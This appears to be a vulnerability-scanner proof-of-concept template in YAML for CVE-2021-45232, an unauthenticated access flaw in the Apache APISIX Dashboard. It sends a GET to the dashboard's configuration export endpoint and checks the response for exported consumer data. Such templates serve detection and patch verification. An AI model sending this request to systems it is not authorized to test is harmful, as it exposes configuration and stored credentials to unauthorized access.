name: yaml-poc-apache-apisix_dashboard-unauthorized_access-CVE-2021-45232
binding: c6a59e68-69c1-4ed9-823f-8542d1069f9a
detail:
    author: system_user
    links:
        - http://www.openwall.com/lists/oss-security/2021/12/27/1
        - https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232
        - https://lists.apache.org/thread/979qbl6vlm8269fopfyygnxofgqyn6k5
        - https://nvd.nist.gov/vuln/detail/CVE-2021-45232
        - https://seclists.org/oss-sec/2021/q4/180
        - https://www.cybersecurity-help.cz/vdb/SB2021122711
    vulnerability:
        id: c31eefef-628e-4353-8904-d9535efcc228
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /apisix/admin/migrate/export
        expression: response.status == 200 && response.body.bcontains(b"{\"Consumers") || response.body.bcontains(b"{\"Counsumers") && response.headers["Content-Type"].contains("application/octet-stream")
expression: r0()
